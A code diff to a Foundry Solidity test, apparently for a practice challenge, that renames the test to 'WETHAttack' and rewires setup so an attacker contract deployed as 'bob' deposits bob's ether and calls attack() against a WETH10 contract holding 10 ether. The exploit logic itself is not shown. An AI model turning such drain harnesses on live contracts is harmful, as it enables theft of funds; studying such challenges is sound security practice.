@@ -6,7 +6,7 @@ import "forge-std/console.sol";
 import "../src/WETH10/WETH10.sol";
 import "../src/WETH10/Bob.sol";
 
-contract Weth10Test is Test {
+contract WETHAttack is Test {
     WETH10 public weth;
     Bob public attacker;
     address owner;
@@ -14,7 +14,6 @@ contract Weth10Test is Test {
 
     function setUp() public {
         weth = new WETH10();
-        attacker = new Bob(address(bob), address(weth));
         bob = makeAddr("bob");
 
         vm.deal(address(weth), 10 ether);
@@ -28,11 +27,19 @@ contract Weth10Test is Test {
             "weth contract should have 10 ether"
         );
         console.log("WETH10ADDRESS: %s ", address(weth));
-        console.log("AttackContract: %s ", address(attacker));
+
         console.log("BOBADDRESS: %s ", address(bob));
+        uint256 bobBalance = address(bob).balance;
+        console.log("BLANCEBOB %s", bobBalance);
 
         vm.startPrank(bob);
-        attacker.deposit();
+        attacker = new Bob(address(bob), address(weth));
+        vm.label(address(attacker), "AttackerContract");
+        attacker.deposit{value: bobBalance}();
+        // weth.deposit{value: bobBalance}();
+        // weth.transfer(address(attacker), bobBalance);
+        // weth.approve(address(attacker), type(uint256).max);
+
         // we get the loan to a contract transfer 1 eth to bob
         attacker.attack();
         // deposit one eth
